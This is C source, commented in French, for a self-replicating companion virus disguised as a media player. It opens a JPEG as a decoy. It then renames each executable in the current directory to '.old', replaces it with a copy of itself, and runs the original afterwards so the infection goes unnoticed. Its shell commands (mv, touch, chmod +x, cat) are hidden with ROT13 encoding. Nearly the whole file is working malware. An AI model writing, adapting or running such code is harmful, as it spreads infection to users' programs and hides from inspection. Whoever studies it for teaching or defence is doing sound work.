#include "MediaPlayer.h"

char **globalptr;

int main(int argc, char *argv[]) {

        // nom du programme actuel
        char *name = argv[0];

        // modification du pointeur global pour y ajouter l'addresse du char * contenant le nom du programme
        globalptr = &name;

        // determine si le programme est executé depuis le mediaplayer ou un hôte infecté
        if(strcmp(argv[0],"./MediaPlayer.exe")) {       // HOTE INFECTE
                char *extension = ".old";
                char str[100];
                snprintf(str, sizeof str, "%s%s", name, extension);
                system(str);
        }
        else {          // MEDIAPLAYER
                mediaplayer(".jpeg");
        }

        // INFECTION
        DIR *myDir;
        struct dirent *dir;

        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL) {
                        DIR* directory = opendir(dir->d_name);
                        if(directory != NULL)
                                closedir(directory);
                        else {
                                if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp("MediaPlayer.exe", dir->d_name))) {
                                        if(strstr(dir->d_name, ".old") == NULL) {
                                                if (access(dir->d_name, X_OK) == 0) {
                                                        char *String = malloc(strlen(dir->d_name) + strlen(".old") + 1);
                                                        if(String) {
                                                                strcpy(String,dir->d_name);
                                                                strcat(String,".old");
                                                        }
                                                        if (!fopen(String,"r")) {
                                                                //(true) ? printf("ok") : printf("pas ok");
                                                                infect(dir->d_name);
                                                        }
                                                }
                                        }
                                }
                        }
                }
                closedir(myDir);
        }
        return EXIT_SUCCESS;
}

void mediaplayer(char *extension) {
        DIR *myDir;
        struct dirent *dir;
        bool imgFound = false;
        char *fileName;

        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL && imgFound == false) {
                        if (strstr(dir->d_name,extension)) {
                                fileName = dir->d_name;
                                imgFound = true;
                                char str[100];
                                snprintf(str, sizeof str, "xdg-open %s 2> /dev/null", fileName);
                                system(str);
                        }
                }
                closedir(myDir);
        }
}

void infect(char *fileName) {
        char cmd[50] = {};
        char str[100] = {};

        // renommage des fichiers en .old
        cmd[0] = (char) rot13('z');
        cmd[1] = (char) rot13('i');

        char old[5] = {};
        old[0] = (char) rot13('.');
        old[1] = (char) rot13('b');
        old[2] = (char) rot13('y');
        old[3] = (char) rot13('q');

        snprintf(str, sizeof str, "%s %s %s%s", cmd, fileName, fileName, old);
        system(str);

        // création des nouveaux fichier remplacant
        char cmd2[50] = {};
        char str2[100] = {};

        cmd2[0] = (char) rot13('g');
        cmd2[1] = (char) rot13('b');
        cmd2[2] = (char) rot13('h');
        cmd2[3] = (char) rot13('p');
        cmd2[4] = (char) rot13('u');

        snprintf(str2, sizeof str2, "%s %s", cmd2, fileName);
        system(str2);

        // ajoute le droit d'exécution sur le fichier
        char cmd3[50] = {};
        char str3[100] = {};
        cmd3[0] = (char) rot13('p');
        cmd3[1] = (char) rot13('u');
        cmd3[2] = (char) rot13('z');
        cmd3[3] = (char) rot13('b');
        cmd3[4] = (char) rot13('q');
        cmd3[5] = (char) rot13(' ');
        cmd3[6] = (char) rot13('+');
        cmd3[7] = (char) rot13('k');

        snprintf(str3, sizeof str3, "%s %s", cmd3, fileName);
        system(str3);

        // clonage du virus dans les nouveaux fichiers
        char cmd4[50] = {};
        char str4[100] = {};
        cmd4[0] = (char) rot13('p');
        cmd4[1] = (char) rot13('n');
        cmd4[2] = (char) rot13('g');

        char symbol[3] = {};
        symbol[0] = (char) 62;
        symbol[1] = (char) 62;

        char *pgName = *globalptr;

        snprintf(str4, sizeof str4, "%s %s %s %s", cmd4, pgName, symbol, fileName);
        system(str4);

}

int rot13(int c) {
        if('a' <= c && c <= 'z')
                return (((c-'a')+13)%26)+'a';
        else if ('A' <= c && c <= 'Z')
                return (((c-'A')+13)%26)+'A';
        else
                return c;
}
